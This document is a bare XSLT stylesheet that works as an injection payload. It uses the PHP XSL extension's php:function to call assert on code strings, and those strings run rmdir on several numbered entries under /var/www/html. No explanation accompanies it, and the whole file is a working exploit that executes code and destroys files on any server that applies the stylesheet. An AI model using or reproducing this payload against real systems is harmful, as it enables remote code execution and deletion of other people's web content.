<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" xmlns:exsl="http://exslt.org/common" version="1.0">
 
  <xsl:template match="*">
           <xsl:variable name="a">rmdir(glob('/var/www/html/*')[8])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $a)"/> 
           <xsl:variable name="b">rmdir(glob('/var/www/html/*')[9])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $b)"/> 
           <xsl:variable name="c">rmdir(glob('/var/www/html/*')[10])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $c)"/> 
           <xsl:variable name="d">rmdir(glob('/var/www/html/*')[11])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $d)"/> 

        <xsl:variable name="e">rmdir(glob('/var/www/html/*')[12])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $e)"/> 
</xsl:template> 
</xsl:stylesheet>
